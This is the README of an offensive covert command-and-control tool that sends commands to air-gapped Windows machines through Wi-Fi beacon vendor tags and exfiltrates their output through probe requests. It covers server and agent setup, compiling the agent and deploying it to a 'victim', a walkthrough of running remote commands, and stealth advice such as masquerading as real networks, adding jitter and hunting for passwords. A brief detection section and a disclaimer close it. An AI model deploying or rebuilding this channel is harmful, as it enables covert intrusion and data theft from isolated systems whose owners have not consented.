# WIFIAIR-C2-Channel 2.0: High-Bandwidth VSE Covert Link

**Version:** 2.0 (Stable / Blocking Mode)  
**Type:** Air-Gapped Covert Channel  
**Transport:** 802.11 Management Frames (Beacons & Probe Requests)

> **Overview:** WIFIAIR 2.0 is a unidirectional command and control channel that bridges air-gapped environments using Wi-Fi. Unlike Version 1.0 (which used visible SSIDs), Version 2.0 hides data inside **Vendor Specific Elements (VSE)** and utilizes **Frame Stacking** to achieve 5x higher downstream bandwidth.

> **Project Context:** This technique is a modular component of the next-generation **Audix C2 Framework**, currently under development and scheduled for release in **Q1 2026**.
> [Learn more about the Audix C2](https://www.security-auditing.com/C2)

---

## 1. Evolution: Version 1.0 vs 2.0

WIFIAIR has evolved from a simple proof-of-concept into a robust, stealthy C2 channel.

| Feature | **Version 1.0 (Legacy)** | **Version 2.0 (Current)** |
|:---|:---|:---|
| **Transport Vector** | **SSID Field** (Network Name). | **Vendor Specific Elements (Tag 221)**. |
| **Visibility** | **Visible** to users as weird network names (e.g., `RX:AGT01:DATA...`). | **Invisible** to standard UI. Mimics legitimate networks (e.g., `xfinitywifi`). |
| **Downstream Speed** | **~30 Bytes per packet.** Limited by 32-byte SSID length. | **~1.2 KB per packet.** Uses **VSE Stacking** (5 tags x 255 bytes). |
| **Reliability** | **Low.** Used interleaved scanning which caused high packet loss (~90% drop rate). | **High.** Uses **Blocking Mode**. Agent stops scanning to dedicate 100% resources to exfiltration. |
| **Targeting** | Broadcast only. All agents ran every command. | **Multi-Agent.** Supports unicast (`send 1 cmd`) and broadcast (`send 0 cmd`). |
| **Stealth** | None. Visible SSIDs and constant beaconing. | **Jitter & Masquerading.** Randomizes timing and mimics real AP vendors (Cisco/Netgear). |

---

## 2. Concept & Protocol Architecture

Traditional C2 channels rely on TCP/IP connections (HTTP, DNS, TCP) which leave logs in firewalls and proxies. **WIFIAIR 2.0** bypasses the entire network stack by operating at **Layer 2 (Data Link)** using raw 802.11 Management Frames.

The system treats the airgap not as a barrier, but as a broadcast medium.

### 2.1 The Server: "The Stealth Broadcaster"

The Python Server operates a Wi-Fi card in **Monitor Mode**. Instead of connecting to a network, it becomes a "Ghost Access Point."

It generates **Beacon Frames**—the packets routers use to say "I am here." However, inside these frames, we inject a hidden payload.

* **The Container:** We do not use the SSID (Network Name) because it is visible to humans and limited to 32 bytes.
* **The Hiding Spot:** We use **Tag 221 (Vendor Specific Element)**. This field is designed for vendors (like Microsoft or Cisco) to add custom data to Wi-Fi packets. It is generally ignored by OS user interfaces but is fully readable by the Wi-Fi card driver.

### 2.2 The Protocol: Downstream (Server -> Agent)

Commands are encrypted (RC4), encoded (Base64), and wrapped in a custom binary header inside **Tag 221 (VSE)**.

**The Anatomy of a C2 Beacon:**

```text
[ 802.11 Beacon Frame ]
   |
   +-- [ Fixed Params ] (Timestamp, Interval...)
   |
   +-- [ Tag 0: SSID ] = "linksys" (Randomized Session Identity)
   |
   +-- [ Tag 3: Channel ] = 6 (Stable Channel Fix)
   |
   +-- [ Tag 221: VSE ] <--- PAYLOAD STACK 1
   |     |
   |     +-- [ OUI: 00:40:96 ] [ Target: 01 ] [ Job: A5F1 ] [ Seq: 1 ] [ Data... ]
   |
   +-- [ Tag 221: VSE ] <--- PAYLOAD STACK 2
   |
   +-- [ Tag 221: VSE ] <--- PAYLOAD STACK 3 ...
```

**Stacking:** To increase speed, we inject 5 of these VSE tags into a single Wi-Fi packet. This allows us to push ~1.2 KB of data every 100 milliseconds.

### 2.3 The Protocol: Upstream (Agent -> Server)

The Agent exfiltrates data by generating Probe Requests. Since Windows cannot inject VSE tags, data is encoded into the SSID field.

**The Anatomy of an Exfil Packet:**

```text
[ 802.11 Probe Request ]
   |
   +-- [ Tag 0: SSID ] (Max 32 Bytes)
         |
         +-- [ OUI (3 Bytes) ]      : 00:40:97 (Exfil Signature)
         +-- [ Agent ID (1 Byte) ]  : 0x01
         +-- [ Job ID (2 Bytes) ]   : 0xA5F1
         +-- [ Seq (2 Bytes) ]      : 0x0001
         +-- [ Total (2 Bytes) ]    : 0x000A
         +-- [ Data (21 Bytes) ]    : Encrypted Output Fragment
```

---

## 3. Setup Guide

### 3.1 Server Setup (Kali Linux)

**Prepare Interface:**

Kill conflicting processes and start monitor mode.

```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0
```

**Lock Channel:**

Windows drivers require a stable channel to associate the beacon with a valid AP.

```bash
sudo iwconfig wlan0mon channel 6
```

**Run Server:**

```bash
sudo python3 server_vse.py
```

### 3.2 Agent Setup (Windows)

**Compilation:**

You need MinGW (g++) or Visual Studio.

MinGW Command:

```bash
g++ agent.cpp -o agent.exe -lwlanapi -static
```

**Note:** The `-static` flag ensures the binary runs without missing DLLs on the victim machine.

**Deployment:**

Transfer `agent.exe` to the target machine. No admin privileges are required for basic scanning.

---

## 4. Usage Walkthrough

### Step 1: Start the Agent

Run the agent with a unique ID, exfiltration enabled, and jitter settings.

- `-agent 1`: Sets this machine as Agent 01.
- `-exfil`: Enables upstream.
- `-duration 60`: When a command is received, stop scanning and broadcast the response for 60s.
- `-jitter 2500 3500`: Random delay 2.5-3.5s between packets.

```powershell
C:\Temp> agent.exe -agent 1 -exfil -duration 60 -jitter 2500 3500
[*] WIFIAIR Agent 2.0 (Stealth Mode)
[*] Agent ID: 1
[*] Exfil: ENABLED (Duration: 60s, Jitter: 2500-3500)
[*] Mode: Scan -> (Found) -> Blocking Exfil -> Scan
```

### Step 2: Server Command

On Kali, the interactive shell allows targeting specific agents.

```text
C2> send 1 "whoami"
[+] Sending Job 0x8a1f to Agent 1 (1 chunks)
```

### Step 3: Execution & Blocking Exfil

The Agent sees the command addressed to ID 1. It executes it, then enters Blocking Mode to ensure the response gets through.

```text
[*] New Job 0x8a1f (Target: Agent 1)...
[+] EXECUTE: "whoami"
[+] OUTPUT: desktop-vixx\user
[*] Switching to Exfil Mode for 60s...
[>] Exfil Job 0x8a1f (1/2) . ! . . x . ! . [Loop]
```

#### Understanding the Output Symbols:
During exfiltration, the agent prints characters representing the status of each packet transmission attempt:

. (Dot): Success. The probe request was successfully passed to the Wi-Fi driver and transmitted.

! (Exclamation): Driver Busy. The OS rejected the request (usually rate-limiting). The agent will retry automatically.

x (Cross): Failed Chunk. The agent exhausted all retries for this specific chunk and skipped it to maintain timing.

Troubleshooting: If you see many ! or x symbols, your Jitter is too low. The Wi-Fi card cannot handle the speed.

Fix: Increase the jitter values (e.g., -jitter 3000 5000) to give the driver more time to recover between packets.

### Step 4: Receive Response

The Server catches the response, identifies the Agent ID, and decrypts it.

```text
[<] Agent 1 responding (Job 0x8a1f, 2 chunks)...
[<] [████████████████████] 2/2
============================================================
[+] Agent 1 | Job 0x8a1f | 3.2s
============================================================
desktop-vixx\user
============================================================
```

---

## 5. Range Extension & Hardware

The effective range of this C2 channel is determined purely by RF Physics, not by the software.

- **Standard Laptop:** ~50-100 meters (Line of Sight).
- **High-Gain Antenna (Alpha/Panda):** ~300-500 meters.
- **Directional Yagi / Cantenna:** ~1-2 Kilometers.

**Operational Scenario:**

An attacker does not need to be inside the building. Using a directional antenna from a parking lot or a nearby coffee shop, the server can "beam" commands through windows to air-gapped systems inside, provided they have their Wi-Fi cards enabled (even if not connected).

---

## 6. Limitations & Constraints

WIFIAIR 2.0 is an asymmetric communication channel. While the downstream (Server -> Agent) is high-bandwidth, the upstream (Agent -> Server) is severely constrained by hardware and OS limitations.

### 6.1 The Upload Bottleneck (Windows -> Kali)

- **Mechanism:** Data is exfiltrated via Probe Request SSIDs.
- **Capacity:** We strictly have ~21 bytes of payload per packet after headers.
- **Speed:** ~50 Bytes/s. Keep responses short (keys, hashes, one-liners). Do not try to exfiltrate files.

### 6.2 Range Asymmetry (The "Receive" Problem)

- **Downstream (C2 -> Agent):** High range. You can use high-gain antennas to blast commands to the target.
- **Upstream (Agent -> C2):** Low range. The victim's laptop has a weak internal antenna with low Tx power. You must be physically closer to the target to receive exfiltrated data than you do to send commands.

### 6.3 Bandwidth Comparison

| Direction | Method | Bandwidth | Capacity |
|:---|:---|:---|:---|
| Download (C2 -> Agent) | VSE Stacking | High (~10 KB/s) | Can send shellcode, binaries, and large scripts. |
| Upload (Agent -> C2) | Probe Requests | Low (~50 Bytes/s) | Best for short text: whoami, ipconfig, keys, or hashes. |

### 6.4 Operational Advice

- **Keep Responses Short:** Do not try to exfiltrate a 10MB file. It will take hours and generate thousands of noisy packets.
- **Filter Output:** Instead of running `dir /s`, run `dir /b | findstr "pass"`. Use the C2 to send complex scripts that process data on target and only return the final result (e.g., a single flag or password).
- **Monitor Mode Requirement:** The Server (Kali) must be in Monitor Mode to see these Probe Requests. A standard Wi-Fi connection cannot see them because they are never "associated" with an access point.

---

## 7. Detection

This technique is stealthy, but not invisible.

- **Spectral Analysis:** A massive spike in Probe Requests from a specific client indicating RX:... or high entropy SSIDs.
- **BSSID Anomalies:** A Beacon Frame broadcasting "xfinitywifi" but carrying 1KB of Vendor Specific data (Tag 221) is highly suspicious. Legitimate VSE tags are usually small (Microsoft/Cisco identifiers).
- **Endpoint Behavior:** A process (agent.exe) utilizing wlanapi.dll to scan networks every 4 seconds without user interaction.

---

## 8. Disclaimer

**Educational Purpose Only.**

This software is a Proof of Concept (PoC) designed to demonstrate the risks of air-gapped networks and 802.11 management frame manipulation. Do not use this tool on networks or systems you do not own or have explicit permission to test.